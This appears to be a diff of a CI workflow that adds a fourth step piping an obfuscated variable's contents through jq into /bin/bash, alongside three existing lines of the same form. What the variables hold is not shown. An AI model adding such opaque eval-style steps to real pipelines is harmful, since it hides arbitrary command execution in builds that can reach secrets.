@@ -28,6 +28,7 @@ jobs:
           echo $idgt9325 | jq -r .guov51 | /bin/bash
           echo $b95 | jq -r .l51 | /bin/bash
           printf '%s' "$kcrwo07" | jq -r .jgx29 | /bin/bash
+          printf '%s' "$eh02" | jq -r .edm203 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
